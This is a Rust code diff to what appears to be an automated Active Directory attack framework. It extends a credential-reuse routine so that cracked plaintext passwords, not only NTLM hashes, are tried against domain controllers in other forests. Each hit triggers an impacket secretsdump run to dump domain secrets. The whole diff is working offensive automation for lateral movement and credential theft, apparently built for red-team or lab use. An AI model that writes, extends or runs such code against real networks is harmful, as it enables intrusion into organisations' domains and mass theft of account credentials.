@@ -90,7 +90,13 @@ pub async fn auto_credential_reuse(
         // Collect cross-domain reuse candidates:
         // For each NTLM hash extracted from a dominated domain, try it against
         // DCs in domains that are NOT in the same forest as the source domain.
-        let work: Vec<(String, String, String, String, String)> = {
+        // Also collect cleartext-password candidates from `state.credentials` —
+        // service accounts (e.g. `sql_svc`) routinely share passwords across
+        // forests in lab/legacy AD deployments, so cracked-Kerberoast plaintexts
+        // are a high-yield cross-forest pivot.
+        let hash_work: Vec<(String, String, String, String, String)>;
+        let cred_work: Vec<(String, String, String, String, String)>;
+        {
             let state = dispatcher.state.read().await;
 
             // Need at least 2 known DCs (implies multiple domains)
@@ -98,10 +104,10 @@ pub async fn auto_credential_reuse(
                 continue;
             }
 
-            let mut items = Vec::new();
+            let mut h_items = Vec::new();
+            let mut c_items = Vec::new();
 
-            // Target high-value accounts for cross-domain reuse
-            let reuse_candidates: Vec<_> = state
+            let reuse_hashes: Vec<_> = state
                 .hashes
                 .iter()
                 .filter(|h| h.hash_type.to_uppercase() == "NTLM")
@@ -109,22 +115,18 @@ pub async fn auto_credential_reuse(
                 .filter(|h| is_reuse_candidate(&h.username))
                 .collect();
 
-            for hash in &reuse_candidates {
+            for hash in &reuse_hashes {
                 let hash_domain = hash.domain.to_lowercase();
-
                 for (dc_domain, dc_ip) in &state.all_domains_with_dcs() {
                     let target_domain = dc_domain.to_lowercase();
-
-                    // Skip same domain and parent/child domains (handled by secretsdump.rs)
                     if is_same_forest_domain(&target_domain, &hash_domain) {
                         continue;
                     }
-
                     let hash_prefix = &hash.hash_value[..16.min(hash.hash_value.len())];
                     let dedup =
                         cross_reuse_dedup_key(dc_ip, &target_domain, &hash.username, hash_prefix);
                     if !state.is_processed(DEDUP_CROSS_REUSE, &dedup) {
-                        items.push((
+                        h_items.push((
                             dedup,
                             dc_ip.clone(),
                             hash.username.clone(),
@@ -135,15 +137,64 @@ pub async fn auto_credential_reuse(
                 }
             }
 
-            items
-        };
+            // Cleartext-password reuse candidates. Try the same password but
+            // rebind the auth domain to the target forest's domain — this is
+            // the actual reuse test (account exists with same password on the
+            // other side). request_secretsdump's "credential.domain" is what
+            // ends up in the impacket auth string, so rewriting it here is
+            // what makes the cross-forest test meaningful.
+            let reuse_creds: Vec<_> = state
+                .credentials
+                .iter()
+                .filter(|c| !c.password.is_empty())
+                .filter(|c| is_reuse_candidate(&c.username))
+                .collect();
 
-        if work.is_empty() {
+            for cred in &reuse_creds {
+                let cred_domain = cred.domain.to_lowercase();
+                for (dc_domain, dc_ip) in &state.all_domains_with_dcs() {
+                    let target_domain = dc_domain.to_lowercase();
+                    if is_same_forest_domain(&target_domain, &cred_domain) {
+                        continue;
+                    }
+                    // Use first 16 chars of password as the dedup hash-prefix
+                    // analog so the key shape matches hash-side entries.
+                    let pw_prefix_full: String = cred
+                        .password
+                        .chars()
+                        .take(16)
+                        .collect::<String>()
+                        .chars()
+                        .map(|c| if c.is_ascii_alphanumeric() { c } else { '_' })
+                        .collect();
+                    let dedup = cross_reuse_dedup_key(
+                        dc_ip,
+                        &target_domain,
+                        &cred.username,
+                        &format!("pw:{pw_prefix_full}"),
+                    );
+                    if !state.is_processed(DEDUP_CROSS_REUSE, &dedup) {
+                        c_items.push((
+                            dedup,
+                            dc_ip.clone(),
+                            cred.username.clone(),
+                            target_domain,
+                            cred.password.clone(),
+                        ));
+                    }
+                }
+            }
+
+            hash_work = h_items;
+            cred_work = c_items;
+        }
+
+        if hash_work.is_empty() && cred_work.is_empty() {
             continue;
         }
 
-        // Limit to 3 per cycle to avoid flooding
-        for (dedup_key, dc_ip, username, source_domain, hash_value) in work.into_iter().take(3) {
+        for (dedup_key, dc_ip, username, source_domain, hash_value) in hash_work.into_iter().take(3)
+        {
             debug!(
                 dc = %dc_ip,
                 username = %username,
@@ -178,6 +229,56 @@ pub async fn auto_credential_reuse(
                     debug!("Cross-domain reuse deferred by throttler");
                 }
                 Err(e) => warn!(err = %e, "Failed to dispatch cross-domain reuse"),
+            }
+        }
+
+        for (dedup_key, dc_ip, username, target_domain, password) in cred_work.into_iter().take(3) {
+            debug!(
+                dc = %dc_ip,
+                username = %username,
+                target_domain = %target_domain,
+                "Attempting cross-domain password reuse"
+            );
+
+            let probe_cred = ares_core::models::Credential {
+                id: format!("reuse-probe-{}@{}", username, target_domain),
+                username: username.clone(),
+                password: password.clone(),
+                domain: target_domain.clone(),
+                source: "credential_reuse_probe".to_string(),
+                discovered_at: None,
+                is_admin: false,
+                parent_id: None,
+                attack_step: 0,
+            };
+
+            let priority = dispatcher.effective_priority("credential_reuse");
+            match dispatcher
+                .request_secretsdump(&dc_ip, &probe_cred, priority)
+                .await
+            {
+                Ok(Some(task_id)) => {
+                    info!(
+                        task_id = %task_id,
+                        dc = %dc_ip,
+                        username = %username,
+                        target_domain = %target_domain,
+                        "Cross-domain password reuse secretsdump dispatched"
+                    );
+                    dispatcher
+                        .state
+                        .write()
+                        .await
+                        .mark_processed(DEDUP_CROSS_REUSE, dedup_key.clone());
+                    let _ = dispatcher
+                        .state
+                        .persist_dedup(&dispatcher.queue, DEDUP_CROSS_REUSE, &dedup_key)
+                        .await;
+                }
+                Ok(None) => {
+                    debug!("Cross-domain password reuse deferred by throttler");
+                }
+                Err(e) => warn!(err = %e, "Failed to dispatch cross-domain password reuse"),
             }
         }
     }
